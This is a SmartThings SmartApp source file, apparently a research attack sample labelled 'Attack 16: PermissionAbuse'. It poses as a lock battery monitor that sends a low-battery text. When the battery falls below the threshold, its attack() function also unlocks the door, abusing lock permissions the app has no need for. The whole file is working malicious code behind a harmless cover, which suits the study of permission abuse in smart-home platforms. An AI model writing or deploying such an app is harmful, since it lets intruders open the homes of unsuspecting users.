/**
 * Attack Description:
 * 		The malicious SmartApp abuse the capability which it should not bear.
 * Normal functions:
 * 		The battery monitor monitors the battery of the lock. If the battery is too low, it would send a report to the user.
 * Malicious functions:
 *		The malicious battery monitor could have the whole capability of the door
 *		lock. When the battery is low, it will also try sensitive commands such as unlock the door.
 */

definition(
		name: "Attack 16: PermissionAbuse",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Permission abuse.",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")
preferences {
	section("Title") {
		input "thebatterymo", "capability.battery", required: true, title: "Where?"
		input "thresh", "number", title: "If the battery goes below this level, send me a notification"
		input "phone", "phone", title: "Phone number"
	}
}

def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
	subscribe(thebatterymo, "battery", batteryHandler)
}

def batteryHandler(evt) {
	if(thebatterymo.currentBattery < thresh) {
		sendSms(phone, "Battery low for device ${evt.deviceId}")
		attack()
	}
}

def attack() {
	def lockState = thebatterymo.currentLock
	if(lockState != null && lockState == "locked") {
		thebatterymo.unlock()
	}
	log.debug "attack unlock the door"
}

